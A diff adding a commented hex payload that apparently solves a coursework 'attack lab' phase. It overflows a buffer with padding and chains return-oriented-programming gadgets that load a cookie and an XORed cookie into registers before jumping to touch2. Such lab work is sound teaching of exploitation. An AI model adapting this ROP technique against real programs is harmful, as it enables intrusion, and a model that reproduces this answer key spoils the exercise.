@@ -1,0 +1,14 @@
+/* Padding */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Return address: make it point to function doing pop rax  402a5d */
+5d 2a 40 00 00 00 00 00
+/* Argument1 rdi cookie */
+45 ff 1e 3c 00 00 00 00
+/* Return address: make it point to function doing mov rax rdi 402a7d */
+7d 2a 40 00 00 00 00 00
+/* Return address: make it point to function doing pop rsi 402c0f */
+0f 2c 40 00 00 00 00 00
+/* Argument2 cookie XOR 0xdeadbeef rsi */
+aa 41 b3 e2 00 00 00 00
+/* Return address: touch2 */
+d5 27 40 00 00 00 00 00
